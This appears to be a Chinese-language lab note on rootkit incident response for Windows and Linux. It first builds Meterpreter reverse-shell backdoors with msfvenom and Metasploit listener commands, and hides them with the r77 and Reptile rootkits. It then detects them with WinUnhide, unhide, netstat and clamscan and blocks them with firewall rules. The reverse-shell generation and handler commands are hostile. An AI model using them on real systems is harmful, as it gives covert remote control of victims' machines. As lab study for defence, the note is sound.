# Rootkit

[toc]

windows Rootkit

模拟后门 生成文件

```
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.182.129 LPORT=5566 -f exe -o http.exe
```

![image-20260316203200807](images/image-20260316203200807.png)

靶机利用工具 查看network

![image-20260316205002595](images/image-20260316205002595.png)

```
msfconsole
use exploit/multi/handler   用于接收 payload 连接
set payload windows/meterpreter/reverse_http   通过 HTTP 反弹连接
set lhost 0.0.0.0   监听所有网卡
set lport 5566  
run
```

![image-20260316203400454](images/image-20260316203400454.png)

运行后门观察网络情况

![image-20260316205123597](images/image-20260316205123597.png)

用火绒剑观察

![image-20260316210559869](images/image-20260316210559869.png)

利用r77工具隐藏进程   用火绒剑无法找到进程

![image-20260317102531167](images/image-20260317102531167.png)

![image-20260317102956749](images/image-20260317102956749.png)

# 应急思路：

1、如果识别到什么项目rookit可以下载工具还原

2、识别不到的情况下采用发现隐藏进程网络等项目

找到对方用的rookit软件，下载相同工具进行卸载

![image-20260317105339430](images/image-20260317105339430.png)

![image-20260317105523208](images/image-20260317105523208.png)

利用WinUnhide  

```
WinUnhide.exe sys    //查询隐藏进程
```

![image-20260317110931752](images/image-20260317110931752.png)

![image-20260317110924477](images/image-20260317110924477.png)

```
WinUnhide-tcp.exe      //查询隐藏网络进程
```

![image-20260317111103959](images/image-20260317111103959.png)

```
netstat -an
```

![image-20260317112052499](images/image-20260317112052499.png)

## 防火墙封堵

![image-20260317113417661](images/image-20260317113417661.png)

设置出站规则

![image-20260317112949572](images/image-20260317112949572.png)

![image-20260317112956970](images/image-20260317112956970.png)

这里封堵的是远程端口，我们要封堵的是本地端口

![image-20260317113124245](images/image-20260317113124245.png)

封堵时候会变端口 

![image-20260317113442541](images/image-20260317113442541.png)

==所以要封堵远程端口==5566

![image-20260317113632220](images/image-20260317113632220.png)

## Linux Rootkit

#### 实验环境

攻击机

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.182.129 LPORT=1111 -f elf >1.elf    //生成文件
```

```
msfconsole
set payload linux/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 1111
run
```

![image-20260317163004792](images/image-20260317163004792.png)

靶机给予权限 和 运行

![image-20260317162826494](images/image-20260317162826494.png)

```
ps -ef
```

可以看到进程

![image-20260317163437454](images/image-20260317163437454.png)

```
netstat -anpt   //查看外连情况
```

![image-20260317163655785](images/image-20260317163655785.png)

利用Reptile 隐藏进程

![image-20260317200308924](images/image-20260317200308924.png)

恢复进程

![image-20260317200333953](images/image-20260317200333953.png)

### unhide 查询隐藏进程

```
unhide quick
```

![image-20260317201746411](images/image-20260317201746411.png)

### rkhunter 查询隐藏进(没用)

```
rkhunter -c
```

## clamscan

```
 clamscan -r -i lu'k
```

![image-20260317212644118](images/image-20260317212644118.png)
